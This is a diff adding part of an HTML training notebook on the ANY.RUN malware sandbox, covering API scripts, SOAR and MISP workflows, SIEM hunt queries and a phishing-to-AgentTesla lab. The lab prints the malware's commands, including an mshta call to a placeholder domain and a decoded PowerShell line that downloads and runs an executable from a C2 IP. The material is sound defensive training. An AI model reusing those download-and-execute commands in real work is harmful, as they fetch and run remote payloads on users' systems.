+API_KEY = "YOUR_API_KEY"
+BASE_URL = "https://api.any.run/v1"
+HEADERS = {"Authorization": f"API-Key {API_KEY}"}
+
+def submit_hash_lookup(sha256_hash):
+    """Check if ANY.RUN has existing analysis for a hash."""
+    # ANY.RUN doesn't have direct hash search in v1 API
+    # Use submissions search instead:
+    resp = requests.get(
+        f"{BASE_URL}/analysis",
+        headers=HEADERS,
+        params={"hash": sha256_hash}
+    )
+    return resp.json()
+
+def get_iocs(task_id):
+    """Retrieve IOCs from completed task."""
+    resp = requests.get(
+        f"{BASE_URL}/analysis/{task_id}/ioc",
+        headers=HEADERS
+    )
+    return resp.json()
+
+def submit_file(file_path):
+    with open(file_path, "rb") as f:
+        resp = requests.post(
+            f"{BASE_URL}/analysis",
+            headers=HEADERS,
+            files={"file": f},
+            data={
+                "obj_type": "file",
+                "env_os": "windows",
+                "env_version": "10",
+                "opt_timeout": 120
+            }
+        )
+    task_id = resp.json()["data"]["taskid"]
+    print(f"Submitted. Task ID: {task_id}")
+
+    # Poll for completion
+    while True:
+        time.sleep(15)
+        status = requests.get(
+            f"{BASE_URL}/analysis/{task_id}",
+            headers=HEADERS
+        ).json()
+        if status["data"]["status"] == "done":
+            break
+
+    return get_iocs(task_id)</code></pre>
+
+  <h2>SOAR Integration Pattern</h2>
+  <pre><code"># Typical SOAR playbook flow:
+# 1. Alert fires in SIEM (suspicious file hash)
+# 2. SOAR extracts hash → queries VirusTotal (enrichment)
+# 3. If VT score > 5 → submit to ANY.RUN via API
+# 4. Wait for analysis completion (poll or webhook)
+# 5. Extract IOCs from ANY.RUN response
+# 6. Push IOCs to MISP event
+# 7. Auto-block C2 IP in firewall via API
+# 8. Create incident ticket with full IOC list + ANY.RUN report URL</code></pre>
+
+  <div class="xref-group">
+    <span>Related:</span>
+    <a href="#" class="xref" onclick="loadTopic('ioc'); return false;">IOC Extraction ↗</a>
+    <a href="#" class="xref" onclick="loadTopic('report'); return false;">Report Export ↗</a>
+  </div>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Using the ANY.RUN API for Basic Automation</h4>
+      <ul>
+        <li>All API calls use HTTPS (L7) to the base URL <code>https://api.any.run/v1/</code></li>
+        <li>Authenticate with an API key passed in the <code>Authorization</code> header — never embed keys in scripts committed to version control</li>
+        <li>Submit a file or URL, receive a task ID, then poll the task status endpoint until analysis completes</li>
+        <li>API access requires a paid subscription — check limits with <code>GET /user/limits</code></li>
+      </ul>
+      <pre><code><span class="cm"># Submit a file via API (curl):</span>
+curl -X POST https://api.any.run/v1/analysis \
+  -H "Authorization: API-Key YOUR_KEY" \
+  -F "file=@sample.exe" \
+  -F "env_os=windows" -F "env_version=10" -F "obj_type=file"</code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>Polling and IOC Retrieval in Python</h4>
+      <ul>
+        <li>After submitting, poll <code>GET /analysis/{taskId}</code> every 15 seconds until status == "done"</li>
+        <li>Retrieve IOCs with <code>GET /analysis/{taskId}/ioc</code> — returns L3 IPs, L4 ports, and L7 domains/URLs/hashes</li>
+        <li>Download the PCAP with <code>GET /analysis/{taskId}/pcap</code> for offline Zeek/Wireshark analysis</li>
+      </ul>
+      <pre><code><span class="cm"># Poll for task completion then get IOCs:</span>
+import requests, time
+HEADERS = {"Authorization": "API-Key YOUR_KEY"}
+BASE = "https://api.any.run/v1"
+
+task_id = "your-task-uuid"
+while True:
+    time.sleep(15)
+    r = requests.get(f"{BASE}/analysis/{task_id}", headers=HEADERS).json()
+    if r["data"]["status"] == "done":
+        break
+
+iocs = requests.get(f"{BASE}/analysis/{task_id}/ioc", headers=HEADERS).json()
+print(iocs)</code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>SOAR Playbook Integration</h4>
+      <ul>
+        <li>Integrate ANY.RUN API into SOAR playbooks: SIEM alert fires → extract hash → VirusTotal enrichment → if score &gt; 5 then submit to ANY.RUN</li>
+        <li>After analysis completes, auto-push extracted IOCs to MISP and create firewall block rules for C2 IPs via API</li>
+        <li>Use webhook callbacks (where supported) instead of polling to reduce API credit usage and improve response time</li>
+      </ul>
+      <pre><code><span class="cm"># Full SOAR flow (pseudocode):</span>
+<span class="cm"># 1. SIEM alert: suspicious file hash detected on endpoint</span>
+<span class="cm"># 2. SOAR: GET /vt/v3/files/{sha256} → if malicious_count > 5:</span>
+<span class="cm"># 3. SOAR: POST /api.any.run/v1/analysis (submit file)</span>
+<span class="cm"># 4. SOAR: poll until done → GET /ioc → extract L3 C2 IPs</span>
+<span class="cm"># 5. SOAR: POST /misp/events (push IOCs with TLP:AMBER)</span>
+<span class="cm"># 6. SOAR: POST /firewall/block {ip: "185.220.101.47"}</span>
+<span class="cm"># 7. SOAR: POST /jira/issue (create IR ticket with report URL)</span></code></pre>
+    </div>
+  </details>
+</template>
+
+<!-- ============================================================
+     SECTION 10 — Threat Intelligence Workflows
+     ============================================================ -->
+<template id="tpl-intel">
+  <h1>Threat Intelligence Workflows</h1>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l3">L3 Network</span>
+    <span class="osi-chip l4">L4 Transport</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">Threat intelligence workflows consume IOCs from all layers: L3 C2 IPs for firewall blocking, L4 port patterns for anomaly detection, and L7 domains/hashes/mutexes for high-confidence SIEM and MISP correlation.</span>
+  </div>
+  <p>ANY.RUN is a powerful source for threat intelligence production. Its public task database contains millions of analyzed samples, providing a searchable repository of malware behaviors and IOCs.</p>
+
+  <h2>Searching Public Tasks</h2>
+  <p><strong>app.any.run/submissions</strong> — search public analysis tasks by:</p>
+  <ul>
+    <li><strong>Hash (MD5/SHA1/SHA256)</strong> — find existing analysis of a known sample</li>
+    <li><strong>Filename</strong> — search by original file name</li>
+    <li><strong>Domain/IP</strong> — find all samples communicating with a given C2</li>
+    <li><strong>Tag</strong> — search by malware family tag (ransomware, stealer, rat, loader)</li>
+    <li><strong>Suricata SID</strong> — find samples matching a specific IDS rule</li>
+  </ul>
+
+  <h2>Malware Family Tags</h2>
+  <table>
+    <tr><th>Tag</th><th>Malware Type</th><th>Common Indicators</th></tr>
+    <tr><td>ransomware</td><td>File-encrypting extortion</td><td>Mass file extension changes, vssadmin delete, ransom note drop</td></tr>
+    <tr><td>stealer</td><td>Credential/data theft</td><td>Browser DB access, clipboard capture, SMTP exfil</td></tr>
+    <tr><td>rat</td><td>Remote Access Trojan</td><td>Persistent C2 beacon, keylogger, screen capture</td></tr>
+    <tr><td>loader</td><td>Initial access payload</td><td>Downloads second stage, injects into process, then exits</td></tr>
+    <tr><td>dropper</td><td>File-dropping stager</td><td>Writes executable to disk, executes, self-deletes</td></tr>
+    <tr><td>miner</td><td>Cryptominer</td><td>High CPU, stratum mining pool connections (port 3333/4444)</td></tr>
+    <tr><td>botnet</td><td>DDoS / spam bot</td><td>IRC/HTTP C2, mass network scanning</td></tr>
+    <tr><td>banker</td><td>Banking trojan</td><td>Browser injection, form grabbing, webinject targets</td></tr>
+  </table>
+
+  <h2>Threat Hunting with ANY.RUN</h2>
+  <pre><code># Scenario: Hunting for AgentTesla samples in the last 7 days
+# Search: app.any.run/submissions → Tag: AgentTesla → Date: last 7 days
+
+# From search results, collect:
+# - All unique C2 IPs/domains (SMTP servers used for exfil)
+# - All unique mutex names
+# - Process tree patterns
+
+# Cross-reference extracted IPs against your SIEM:
+# Splunk: index=* dest_ip IN (185.220.101.47, 194.5.249.12)
+# ELK: destination.ip: (185.220.101.47 OR 194.5.249.12)
+
+# If matches found → likely active AgentTesla infection</code></pre>
+
+  <h2>Integrating with MISP for Intel Sharing</h2>
+  <pre><code"># Workflow:
+# 1. Analyze sample in ANY.RUN
+# 2. ANY.RUN → IOC tab → Export → MISP Event
+# 3. In MISP: Import Event → paste JSON
+# 4. Add ATT&CK galaxy tags from ANY.RUN's ATT&CK mapping
+# 5. Set TLP:AMBER for team sharing, TLP:GREEN for community feeds
+# 6. Correlate with existing MISP events → related campaigns?
+
+# MISP attribute types from ANY.RUN IOCs:
+# IPs → ip-dst (C2 traffic direction)
+# Domains → domain
+# URLs → url
+# File hashes → file|sha256
+# Registry keys → regkey
+# Mutex → mutex</code></pre>
+
+  <div class="xref-group">
+    <span>Related:</span>
+    <a href="#" class="xref" onclick="loadTopic('ioc'); return false;">IOC Extraction ↗</a>
+    <a href="#" class="xref" onclick="loadTopic('api'); return false;">API Integration ↗</a>
+  </div>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Searching and Using Public Task Data</h4>
+      <ul>
+        <li>Search ANY.RUN's public database at app.any.run/submissions by hash, filename, domain/IP, or malware family tag</li>
+        <li>Searching by L3 C2 IP finds all samples communicating with the same infrastructure — reveals campaign scope</li>
+        <li>Searching by malware family tag (e.g., "ransomware", "rat") quickly surfaces current C2 infrastructure and behaviors</li>
+        <li>Use found IOCs to hunt your SIEM for matching internal traffic before writing detections</li>
+      </ul>
+      <pre><code><span class="cm"># Search ANY.RUN public tasks for AgentTesla samples (last 7 days):</span>
+<span class="cm"># app.any.run/submissions → Tag: AgentTesla → Date: last 7 days</span>
+<span class="cm"># Collect: C2 IPs, mutex names, process chain patterns</span>
+
+<span class="cm"># SIEM hunt for collected L3 IPs (Splunk):</span>
+index=network dest_ip IN (185.220.101.47, 194.5.249.12)
+| stats count by src_ip, dest_port</code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>Building Intel from ANY.RUN Public Data</h4>
+      <ul>
+        <li>Collect IOCs across multiple related public tasks to build a comprehensive campaign infrastructure picture</li>
+        <li>Cross-reference L3 C2 IPs across malware family tags to identify bulletproof hosting providers used by multiple threat actors</li>
+        <li>Track mutex naming patterns across ransomware or RAT samples to identify the malware builder version</li>
+      </ul>
+      <pre><code><span class="cm"># Pivot: find all samples using the same L3 C2 IP:</span>
+<span class="cm"># app.any.run/submissions → search by IP: 185.220.101.47</span>
+<span class="cm"># Note all malware families and file hashes returned</span>
+
+<span class="cm"># ELK SIEM hunt for all collected C2 IPs:</span>
+destination.ip: (185.220.101.47 OR 194.5.249.12 OR 45.33.78.104)
+AND event.action: "connection"</code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>MISP-Integrated Intel Production Pipeline</h4>
+      <ul>
+        <li>Establish a repeatable workflow: ANY.RUN analysis → IOC export → MISP event creation → ATT&CK galaxy tagging → TLP classification → community sharing</li>
+        <li>Use MISP correlation to automatically match new ANY.RUN IOCs against existing events — identifies overlapping campaigns and infrastructure reuse</li>
+        <li>Set TLP:AMBER for internal team sharing; promote to TLP:GREEN for ISAC/community feeds after manual review</li>
+      </ul>
+      <pre><code><span class="cm"># MISP attribute type mapping from ANY.RUN IOCs:</span>
+<span class="cm"># L3 IPs      → ip-dst</span>
+<span class="cm"># L7 Domains  → domain</span>
+<span class="cm"># L7 URLs     → url</span>
+<span class="cm"># File hashes → file|sha256</span>
+<span class="cm"># Registry    → regkey</span>
+<span class="cm"># Mutex       → mutex</span>
+
+<span class="cm"># Import to MISP:</span>
+<span class="cm"># ANY.RUN → IOC tab → Export → MISP Event → paste JSON in MISP</span>
+<span class="cm"># Add: misp-galaxy:mitre-attack-pattern="T1071.001 HTTP C2"</span></code></pre>
+    </div>
+  </details>
+</template>
+
+<!-- ============================================================
+     SECTION 11 — Investigation Lab
+     ============================================================ -->
+<template id="tpl-lab">
+  <h1>Investigation Lab — Phishing to RAT Analysis</h1>
+
+  <div class="callout lab">
+    <strong>Lab Scenario</strong>: A user received a phishing email with an attachment: <code>Invoice_Q1_2024.xlsm</code>. The file was flagged by YARA with rule "Excel4Macro_Dropper". Your task is to analyze it in ANY.RUN to determine payload, C2, and full infection chain.
+  </div>
+
+  <h2>Phase 1 — Initial Submission</h2>
+  <pre><code># 1. Navigate to: app.any.run
+# 2. Click "New Task"
+# 3. Upload: Invoice_Q1_2024.xlsm
+# 4. Configure environment:
+#    OS: Windows 10 (64-bit)
+#    User Activity: Mouse movement (realistic)
+#    Network: Enabled
+#    Country: United States
+#    Browser: Chrome (latest)
+#    Archive Password: (none)
+#
+# 5. Under "Advanced Options":
+#    Enable Content: Yes (auto-click "Enable Editing" in Office)
+#    UAC Prompt: Auto-confirm
+#    Duration: 120 seconds
+#
+# 6. Click "Run"</code></pre>
+
+  <h2>Phase 2 — Live Observation</h2>
+  <pre><code"># While analysis runs, watch the process tree live:
+
+# Expected chain for Excel4 (XLM) macro dropper:
+# Excel.exe (parent)
+#   → cmd.exe /c mshta http://malicious.example.com/payload.hta
+#       → mshta.exe (downloads and runs HTA)
+#           → wscript.exe payload.vbs
+#               → powershell.exe -enc [base64]
+#                   → malware.exe (dropped to %TEMP%)
+
+# Watch Network panel as each step occurs:
+# DNS query: malicious.example.com → 185.220.101.47
+# HTTP GET: /payload.hta → 200 OK (file downloaded)
+# HTTP GET: /malware.exe → 200 OK (second stage download)
+# HTTP POST: /beacon/check → (C2 checkin)
+
+# Watch for Suricata alerts firing in Threats panel</code></pre>
+
+  <h2>Phase 3 — Process Tree Analysis</h2>
+  <pre><code># After analysis completes, examine each red/orange process:
+
+# Excel.exe:
+#   Command: "C:\Program Files\Microsoft Office\Excel.exe" Invoice_Q1_2024.xlsm
+#   Severity: Suspicious
+#   API Calls: FindFirstFile (hunting for security tools?), RegOpenKey
+
+# cmd.exe (child of Excel):
+#   Command: cmd.exe /c mshta http://185.220.101.47/payload.hta
+#   Severity: MALICIOUS
+#   Note: cmd.exe spawned by Office = macro execution confirmed
+
+# powershell.exe:
+#   Command: powershell.exe -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAc...
+#   Severity: MALICIOUS
+#   Decode the base64:
+#   echo "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAc..." | base64 -d
+#   Result: Invoke-WebRequest -Uri http://185.220.101.47/malware.exe -OutFile $env:TEMP\svchost32.exe; Start-Process $env:TEMP\svchost32.exe</code></pre>
+
+  <h2>Phase 4 — Network &amp; IOC Extraction</h2>
+  <pre><code># Network panel findings:
+# DNS: malicious.example.com → 185.220.101.47
+# HTTP GET: http://185.220.101.47/payload.hta  (200 OK, 4.2KB)
+# HTTP GET: http://185.220.101.47/malware.exe  (200 OK, 892KB)
+# HTTP POST: http://185.220.101.47/gate.php    (C2 beacon, interval: 30s)
+#
+# Suricata Threats:
+# [HIGH] ET TROJAN AgentTesla/OriginLogger Exfil via HTTP POST (SID:2031453)
+# [MED]  ET INFO Suspicious mshta.exe Network Connection (SID:2029850)
+
+# IOC tab exports:
+# IPs: 185.220.101.47
+# Domains: malicious.example.com
+# URLs:
+#   http://185.220.101.47/payload.hta
+#   http://185.220.101.47/malware.exe
+#   http://185.220.101.47/gate.php
+# File SHA-256: a7f3bc29d1e8f4c5b2a0e6d9c3f7b1a4e2d8c5f9b3a6e0d4c7f1b8a2e5d9c3f
+# Registry: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate
+# Mutex: Global\AgentTesla_v3_mutex</code></pre>
+
+  <h2>Phase 5 — ATT&CK &amp; Reporting</h2>
+  <pre><code># ATT&CK panel shows (confirmed techniques):
+# T1566.001 - Spearphishing Attachment (Excel file)
+# T1204.002 - Malicious File (user opened .xlsm)
+# T1059.005 - Visual Basic (VBScript execution)
+# T1059.001 - PowerShell (encoded download)
+# T1218.005 - Mshta (LOLBin used for initial download)
+# T1105     - Ingress Tool Transfer (malware.exe download)
+# T1071.001 - HTTP C2 (gate.php beacon)
+# T1547.001 - Registry Run Keys (persistence)
+# T1056.001 - Keylogging (AgentTesla behavior)
+# T1020     - Automated Exfiltration (HTTP POST every 30s)
+
+# Actions:
+# 1. Export IOC list → add to MISP event
+# 2. Block 185.220.101.47 in firewall + proxy
+# 3. Block malicious.example.com in DNS filter
+# 4. Add SHA-256 of malware.exe to EDR blocklist
+# 5. Write Suricata rule for gate.php User-Agent pattern
+# 6. Write YARA rule for AgentTesla mutex + string patterns
+# 7. Hunt SIEM for other hosts connecting to 185.220.101.47
+
+# SIEM hunt query (Splunk):
+index=network dest_ip=185.220.101.47
+| stats count by src_ip, dest_port
+| where count > 1
+
+# SIEM hunt query (ELK/KQL):
+destination.ip: "185.220.101.47" AND event.action: "connection"</code></pre>
+
+  <h2>IOC Summary Table</h2>
+  <table>
+    <tr><th>IOC Type</th><th>Value</th><th>Confidence</th></tr>
+    <tr><td>C2 IP</td><td>185.220.101.47</td><td>High</td></tr>
+    <tr><td>C2 Domain</td><td>malicious.example.com</td><td>High</td></tr>
+    <tr><td>C2 URL</td><td>http://185.220.101.47/gate.php</td><td>High</td></tr>
+    <tr><td>Dropper Hash</td><td>a7f3bc29...c3f (SHA-256)</td><td>High</td></tr>
+    <tr><td>Mutex</td><td>Global\AgentTesla_v3_mutex</td><td>High</td></tr>
+    <tr><td>Registry Persistence</td><td>HKCU\...\Run\WindowsUpdate</td><td>Medium</td></tr>
+    <tr><td>SSL Certificate</td><td>SHA1 from TLS handshake to C2</td><td>Medium</td></tr>
+    <tr><td>JA3S Hash</td><td>From TLS session with C2</td><td>Medium</td></tr>
+  </table>
+
+  <div class="callout">
+    <strong>Lab Complete</strong> — You have performed a full interactive sandbox analysis, decoded an encoded PowerShell downloader, mapped the full infection chain to ATT&CK, extracted high-confidence IOCs, and built actionable detections. These IOCs should now be pushed to MISP, the C2 blocked in your network perimeter, and a SIEM hunt run across all endpoints.
+  </div>
+</template>
+
+<script>
+window.NOTEBOOK = {
+  title: 'ANY.RUN',
+  topics: [
+    { id: 'overview',   badge: '01', label: 'Overview & Architecture'          },
+    { id: 'submission', badge: '02', label: 'Task Submission & Environment'    },
+    { id: 'process',    badge: '03', label: 'Live Process Tree Navigation'     },
+    { id: 'network',    badge: '04', label: 'Network Activity Capture'         },
+    { id: 'ioc',        badge: '05', label: 'IOC Extraction'                   },
+    { id: 'suricata',   badge: '06', label: 'Suricata & Snort Correlation'     },
+    { id: 'attack',     badge: '07', label: 'MITRE ATT&CK Mapping'            },
+    { id: 'report',     badge: '08', label: 'Report Export'                    },
+    { id: 'api',        badge: '09', label: 'API Integration'                  },
+    { id: 'intel',      badge: '10', label: 'Threat Intelligence Workflows'    },
+    { id: 'lab',        badge: '11', label: 'Investigation Lab'                },
+  ]
+};
+</script>
+<script src="js/app.js"></script>
+</body>
+</html>
